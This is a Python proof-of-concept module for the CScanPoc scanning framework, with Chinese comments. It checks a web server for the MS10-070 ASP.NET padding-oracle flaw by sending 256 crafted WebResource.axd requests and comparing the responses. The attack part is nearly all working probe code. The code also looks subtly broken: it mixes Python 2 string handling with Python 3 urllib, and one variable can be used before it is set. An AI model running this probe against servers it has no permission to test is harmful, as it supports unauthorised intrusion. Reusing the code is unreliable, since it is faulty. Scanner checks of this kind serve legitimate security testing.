# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse
import base64


class Vuln(ABVuln):
    vuln_id = 'MS10_070'  # 平台漏洞编号
    name = 'Microsoft-ASP.NET Padding Oracle信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2010-10-06'  # 漏洞公布时间
    desc = '''
        Microsoft ASP.NET 攻击者通过此漏洞最终可以达到任意文件读取的效果。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/15213/'  # https://www.exploit-db.com/exploits/15213/  https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-070
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2010-3332'  # cve编号
    product = 'Microsoft-ASP.NET'  # 漏洞组件名称
    product_version = 'Windows XP、Windows Server 2003、Windows Vista、Windows Server 2008、Windows Server 2008 R2、Windows 7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e651c43a-194b-43fd-b06b-adf8d3ef61dd'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            url = '{target}'.format(target=self.target)
            res_html = urllib.request.urlopen(url).read()
            if 'WebResource.axd?d=' in res_html:
                error_i = 0
                bglen = 0
                for k in range(0, 255):
                    IV = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                         chr(k)
                    bgstr = 'A' * 21 + '1'
                    enstr = base64.b64encode(IV).replace(
                        '=', '').replace('/', '-').replace('+', '-')
                    exp_url = "%s/WebResource.axd?d=%s" % (url, enstr + bgstr)
                    try:
                        request = urllib.request.Request(exp_url)
                        res = urllib.request.urlopen(request)
                        res_html = res.read()
                        res_code = res.code
                    except urllib.error.HTTPError as e:
                        res_html = e.read()
                        res_code = e.code
                    except urllib.error.URLError as e:
                        error_i += 1
                        if error_i >= 3:
                            return
                    except:
                        return
                    if int(res_code) == 200 or int(res_code) == 500:
                        if k == 0:
                            bgcode = int(res_code)
                            bglen = len(res_html)
                        else:
                            necode = int(res_code)
                            if (bgcode != necode) or (bglen != len(res_html)):
                                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                    target=self.target, name=self.vuln.name))
                            else:
                                return

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
